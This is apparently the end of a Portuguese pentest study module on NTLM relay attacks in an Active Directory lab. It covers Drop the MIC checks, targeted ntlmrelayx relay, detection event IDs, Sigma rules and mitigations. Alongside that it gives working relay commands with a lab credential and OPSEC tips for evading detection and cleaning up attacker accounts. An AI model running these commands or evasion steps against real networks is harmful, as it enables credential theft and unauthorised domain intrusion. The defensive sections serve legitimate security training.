# SMB    172.16.117.50  INLANEFREIGHT/JPEREZ  FALSE  445
# SMB    172.16.117.50  INLANEFREIGHT/PETER   TRUE   445
# HTTPS  172.16.117.50  INLANEFREIGHT/RMONTY  N/A    1433
# MSSQL  172.16.117.60  INLANEFREIGHT/NPORTS  N/A    1433
```

### 13. Verificar Vulnerabilidade CVE-2019-1040 (Drop the MIC)

```bash
# Scanner para verificar se alvo e vulneravel ao Drop the MIC
python3 scan.py inlanefreight/plaintext$:'o6@ekk5/#rlw2rAe'@172.16.117.3
# [*] Target 172.16.117.3 is not vulnerable to CVE-2019-1040 (authentication was rejected)

# Se vulneravel, usar --remove-mic no ntlmrelayx:
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --remove-mic
```

### 14. Named Target Relay (Relay de Usuario Especifico)

```bash
# Relay apenas de autenticacoes do usuario PETER para o alvo
ntlmrelayx.py -t smb://INLANEFREIGHT\\PETER@172.16.117.50 -smb2support -socks

# Desabilitar multi-relay para aceitar apenas primeira conexao do usuario
ntlmrelayx.py -t smb://INLANEFREIGHT\\PETER@172.16.117.50 --no-multirelay
```

---

## Deteccao e OPSEC

### Event IDs Relevantes para Deteccao

```
4624 - Logon bem-sucedido
       Type 3 = Network (SMB, WinRM) — verificar se origem e esperada
       Correlacionar com 4648 (explicit credentials logon)

4648 - Logon usando credenciais explicitas — indica relay ou PtH

4776 - Autenticacao NTLM — deve ser monitorado
       Verificar se Workstation Name esta em branco ou e suspeito

5140 - Acesso a share de rede
       ADMIN$, C$ acessados de hosts inesperados

4672 - Privilegios especiais atribuidos ao logon — admin privileges

7045 - Novo servico instalado — indica PSExec pos-relay

Windows Event 8001/8002/8003/8004 (NTLM Auditing):
- Habilitar via GPO: Computer Configuration > Windows Settings > Security Settings
  > Local Policies > Security Options > Network Security: Restrict NTLM
```

### Indicadores de Comprometimento por NTLM Relay

```
1. Logons de rede (Type 3) para ADMIN$ vindos de hosts que nao tem razao de acessa-lo
2. Acesso ao RemoteRegistry service seguido de dump de SAM
3. Workstation Name em eventos 4776 com valor generico ou vazio
4. Multiplos logons bem-sucedidos do mesmo usuario vindo de IPs diferentes
   em curto intervalo de tempo
5. Contas de computador criadas com nomes suspeitos ou aleatorios
6. Modificacoes de ACL/DACL nao autorizadas no dominio (Event 5136)
7. Requisicoes de certificados suspeitas no CA (Event 4886)
```

### Deteccao de Coercao

```
PrinterBug (MS-RPRN):
- Event 5145: compartilhamento de rede acessado (verificar acesso a IPC$ com
  pipe \spoolss de hosts que nao sao print servers)
- Regra Sigma: detect RpcRemoteFindFirstPrinterChangeNotification calls

PetitPotam (MS-EFSRPC):
- Monitorar chamadas EFS de hosts que nao devem usar EFS remotamente
- Microsoft publicou patch e indicadores para MS-EFSRPC anomalo

Coercion geral:
- Monitorar DC fazendo conexoes de saida na porta 445 ou 80 para hosts internos
  (DC nao deve iniciar conexoes SMB de saida no ambiente normal)
```

### Deteccao via Network Traffic

```
1. Broadcast LLMNR/NBT-NS sendo respondido por host inesperado (nao pelo DNS server)
2. Multiplas requisicoes NTLM AUTHENTICATE para o mesmo destino em curto tempo
3. SMB connection de host A para host B logo apos host B fazer broadcast
4. Requisicoes de certificado via HTTP para o CA (ESC8) vindas de hosts de dominio
```

### Regras Sigma

```yaml
# Deteccao de NTLM Relay via acesso a RemoteRegistry
title: NTLM Relay SAM Dump via RemoteRegistry
detection:
  selection:
    EventID: 7045
    ServiceName: 'RemoteRegistry'
  condition: selection

# Deteccao de novo computador criado por usuario nao privilegiado
title: Suspicious Computer Account Creation
detection:
  selection:
    EventID: 4741
    SubjectUserName|not|endswith: '$'
  filter:
    SubjectUserName|contains: 'admin'
  condition: selection and not filter
```

### OPSEC: Como Reduzir Ruido

```bash
# 1. Usar named targets para relay apenas do usuario especifico
ntlmrelayx.py -t smb://DOMAIN\\SPECIFIC_USER@TARGET

# 2. Usar -socks ao inves de -c para nao executar comandos diretamente
#    (comandos via proxychains sao mais silenciosos)
ntlmrelayx.py -tf targets.txt -socks

# 3. Usar --no-http-server se nao precisar de relay HTTP
#    (reduz portas abertas)
ntlmrelayx.py -tf targets.txt -smb2support --no-http-server

# 4. Especificar -Specific IP Addresses to respond to no Responder.conf
#    para nao responder para todos os hosts da rede
# Editar Responder.conf: Specific IP Addresses to respond to = 192.168.1.10

# 5. Usar mode analyze do Responder primeiro para identificar oportunidades
#    antes de ativar poisoning
sudo python3 Responder.py -I ens192 -A

# 6. Preferir coercao autenticada (PetitPotam com credenciais) vs poisoning
#    broadcast — e mais cirurgica e menos ruidosa

# 7. Limpeza pos-relay: remover contas de computador criadas apos uso
deletecomputer.py DOMAIN/user:password -computer-name 'ATTACKER$'
```

### Mitigacoes (perspectiva defensiva)

```
1. Habilitar SMB Signing Required em todos os hosts (nao apenas DCs)
   GPO: Computer Configuration > Windows Settings > Security Settings >
   Local Policies > Security Options > Microsoft network server: Digitally sign...

2. Desabilitar LLMNR via GPO:
   Computer Configuration > Administrative Templates > Network > DNS Client >
   Turn Off Multicast Name Resolution = Enabled

3. Desabilitar NBT-NS via propriedades do adaptador de rede

4. Habilitar EPA (Extended Protection for Authentication) no IIS/AD CS

5. Requerer HTTPS com certificado valido para endpoints do AD CS
   (elimina ESC8)

6. Configurar ms-DS-MachineAccountQuota = 0 para impedir usuarios
   normais de criar contas de computador

7. Habilitar LDAP signing e channel binding no DC

8. Restringir NTLM via GPO: Deny All Accounts / Restrict to specific servers

9. Habilitar Windows Defender Credential Guard

10. Monitorar e alertar sobre coercao: bloquear MS-RPRN e MS-EFSRPC remotamente
    via firewall ou GPO quando possivel
```

---

## Módulos Relacionados

`01_lateral_movement_windows.md` cobre o que fazer com o hash ou sessão obtida pós-relay — Pass-the-Hash, WMI, WinRM. `../09_active_directory/06_delegacao_constrained_e_rbcd.md` aprofunda RBCD como alvo de relay para escalada de privilégio em AD. `../06_pos_exploracao_windows/03_credenciais_windows.md` cobre dump de SAM e LSA secrets para extrair hashes NT usáveis em ataques de relay.
- Modulo DACL Attacks - Para entender ACL/DACL abuse pos-relay LDAP
- Modulo AD CS - Para ESC1-ESC11 e relay para endpoints HTTPS do CA

### MITRE ATT&CK

- T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
- T1187 - Forced Authentication (coercao)
- T1558.003 - Kerberoasting (pos-relay com tickets)
- T1649 - Steal or Forge Authentication Certificates (ESC8)
- T1003.002 - OS Credential Dumping: Security Account Manager

### Ferramentas e Repositorios

- Impacket: https://github.com/fortra/impacket
- Responder: https://github.com/lgandx/Responder
- PetitPotam: https://github.com/topotam/PetitPotam
- Coercer: https://github.com/p0dalirius/Coercer
- ntlm_theft: https://github.com/Greenwolf/ntlm_theft
- Pretender: https://github.com/RedTeamPentesting/pretender
- CVE-2019-1040 Scanner: https://github.com/fox-it/cve-2019-1040-scanner

### Referencias Academicas e Posts

- Drop the MIC (CVE-2019-1040): Preempt Security / CrowdStrike Blog
- Your Session Key is my Session Key (CVE-2019-1019): Preempt Security
- The Hacker Recipes NTLM Relay: https://www.thehacker.recipes/ad/movement/ntlm/relay
- Mindmap NTLM Relay por @_nwodtuhs (Shutdown): completo overview de todas as combinacoes
- "Bypassing LDAP Channel Binding with StartTLS": explica bypass moderno do ntlmrelayx
- SMB Signing Required by Default in Windows Insider: blog Ned Pyle (Microsoft)
